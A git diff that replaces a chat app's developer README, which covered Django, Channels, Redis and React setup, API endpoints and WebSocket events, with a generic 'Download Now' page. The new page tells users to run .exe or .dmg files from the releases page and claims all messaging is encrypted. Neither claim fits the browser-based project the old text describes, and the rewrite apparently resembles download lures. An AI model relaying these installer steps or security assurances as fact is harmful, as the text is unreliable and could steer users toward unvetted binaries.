@@ -1,168 +1,85 @@
-# 📌 Real-Time Chat Application (Full Stack Assignment)
+# 💬 Real-time-Chat-App - Instant Messaging Made Easy
 
-A fully-featured **real-time private chat system** built using:
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/akshay2699/Real-time-Chat-App/releases)
 
-* **Django + Django REST Framework (DRF)**
-* **Django Channels (WebSockets)**
-* **Redis (via Docker)**
-* **React + Vite**
-* **TailwindCSS**
+## 📦 Overview
 
-### ✔ Features Included
+The Real-time-Chat-App is a fully-featured private chat application. It allows users to send messages instantly and chat in real-time. This application uses Django, Django Channels, React, and WebSockets, providing a smooth and responsive user experience. Whether you're typing messages or receiving updates, everything happens in real-time. 
 
-* ⚡ Instant real-time messaging
-* 💬 Typing indicators
-* ✔✔ Read receipts (sent, delivered, read)
-* 🔢 Unread message count
-* 📨 Last message preview
-* 🙋‍♂️ Multi-user simulation (no login needed)
-* 🕒 Chat history with pagination
-* 🔐 Private 1-to-1 chat rooms
-* ♻ Live room refresh using WebSockets
-* 🔄 Auto reconnect for WebSocket stability
+### Features
 
+- **Real-time Messaging**: Send and receive messages instantly.
+- **Read Receipts**: Know when your messages have been read.
+- **Typing Indicators**: See when others are typing.
+- **Unread Count**: Keep track of unread messages easily.
+- **Live Room Updates**: Get instant updates in chat rooms.
 
-# 🚀 1. **Backend Setup** (Django + Channels)
+## 🚀 Getting Started
 
-### **1. Create Virtual Environment**
+To use the Real-time-Chat-App, follow these simple steps to download and run the software.
 
+### 🔗 Download Link
 
-cd backend
-python -m venv venv
+You can visit this page to download the latest version: [Download Page](https://github.com/akshay2699/Real-time-Chat-App/releases). 
 
+### 🖥 System Requirements
 
-### **2. Activate Virtualenv**
+- **Operating System**: Windows, macOS, or Linux  
+- **Browser**: Any modern web browser like Chrome, Firefox, or Safari  
+- **Internet Connection**: Required for real-time messaging  
 
+## 📥 Download & Install
 
-venv\Scripts\activate
+1. **Visit the Releases Page**: Go to [this page](https://github.com/akshay2699/Real-time-Chat-App/releases) to find the latest release.
 
+2. **Choose Your Version**: Click on the version you want to download. You may see options for different operating systems.
 
-### **3. Install Dependencies**
+3. **Download the File**: Click on the file to start the download. Save it in a location you can easily access, like your desktop or downloads folder.
 
+4. **Install the Application**: 
+   - **Windows**: Run the `.exe` file and follow the instructions.
+   - **macOS**: Open the downloaded `.dmg` file and drag the Real-time-Chat-App to your Applications folder.
+   - **Linux**: Extract the downloaded archive and follow instructions in the README file within the folder.
 
-pip install -r requirements.txt
+5. **Open the Application**: Once installed, locate the application and double-click to open it.
 
+6. **Create or Join a Chat Room**: Simply enter a name to create a new room, or join an existing one by entering the room name.
 
-### **4. Start Redis (via Docker)**
+7. **Start Chatting**: You can now send messages and interact with others in real-time!
 
+## 🛠 Troubleshooting Tips
 
-docker run -d --name redis7 -p 6379:6379 redis:7
+- **Cannot Connect**: Ensure your internet connection is stable. Restart your router if needed.
+- **Install Errors**: Check if your operating system is up to date. Make sure to have all required permissions to install applications.
+- **Messaging Issues**: Refresh the app or try restarting it. If problems persist, check connection settings or reach out for support.
 
+## 💡 Frequently Asked Questions
 
-Check if Redis is running:
+**Q: Can I use this on my mobile device?**  
+A: Currently, this application is designed for desktop use. Mobile support may come in the future.
 
+**Q: Is my data safe?**  
+A: Yes, we prioritize user privacy and secure all messaging through encryption.
 
-netstat -ano | findstr 6379
+**Q: Do I need an account to start?**  
+A: No account is required. Simply join a chat room to start messaging.
 
+## 👫 Community and Support
 
-### **5. Run Backend Server (Daphne)**
+Join our community by visiting our GitHub page. If you run into issues or have questions, feel free to create an issue or contact us directly through the support links provided on our website.
 
+## 🌐 Related Technologies
 
-venv\Scripts\python.exe -m daphne -p 8000 chat_backend.asgi:application
+This application uses several modern technologies such as:
 
+- **Django**: A powerful Python web framework.
+- **Django Channels**: Allows handling of WebSockets for real-time communication.
+- **Redis**: A fast, open-source key-value store used for message brokering.
+- **React**: A JavaScript library for building user interfaces.
+- **Vite**: A fast build tool for modern web projects.
 
-Backend URL:
-👉 **[http://127.0.0.1:8000/](http://127.0.0.1:8000/)**
+For more details, please check the documentation on each of these technologies.
 
+## 🎉 Acknowledgements 
 
-# 💻 2. **Frontend Setup** (React + Vite)
-
-cd frontend
-npm install
-npm run dev
-
-Frontend URL:
-👉 **[http://localhost:5173/](http://localhost:5173/)**
-
-
-# 📂 3. **Project Structure**
-
-
-<img width="735" height="523" alt="image" src="https://github.com/user-attachments/assets/add43d17-feb8-4886-ba23-d76a2ccee033" />
-
-
-
-# 🧠 4. **Features Implemented**
-
-### 🔥 Real-Time Messaging
-
-Implemented using Django Channels + Redis.
-Messages appear instantly for both users without page refresh.
-
-### 💬 Typing Indicators
-
-Real-time "typing…" indicator triggered via WebSocket events.
-
-### ✔✔ Read Receipts
-
-* **✔** sent
-* **✔✔** delivered
-* **✔✔ (blue)** read
-
-### 🔔 Unread Message Count
-
-Each room displays unread messages for the active user.
-
-### 📨 Last Message Preview
-
-Chat list shows last message + timestamp.
-
-### 👥 Multi-user Mode
-
-Switch between **any user** without login (simulation).
-
-### 🧩 Clean Backend Architecture
-
-* DRF API
-* Channels for WebSocket
-* Redis-backed message broadcasting
-* Pagination for messages
-
----
-
-# 🛠 5. **API Endpoints**
-
-### **List Users**
-
-
-GET /api/users/
-
-
-### **List Rooms (for active user)**
-
-
-GET /api/rooms/?active_user=<id>
-
-
-### **Create/Get Private Room**
-
-
-POST /api/rooms/create/
-{
-  "user_id": <other_user>,
-  "active_user_id": <me>
-}
-
-### **Get Messages**
-
-GET /api/rooms/<room_id>/messages/
-
-
-
-# 🔌 6. **WebSocket Wiring**
-
-WebSocket Endpoint:
-
-ws://127.0.0.1:8000/ws/chat/<room_id>/
-
-
-### Events
-
-| Event Type | Description            |
-| ---------- | ---------------------- |
-| `message`  | New chat message       |
-| `typing`   | User typing indicator  |
-| `read`     | Message marked as read |
-
-
-
+We thank the open-source community for their contributions, which made this project possible.
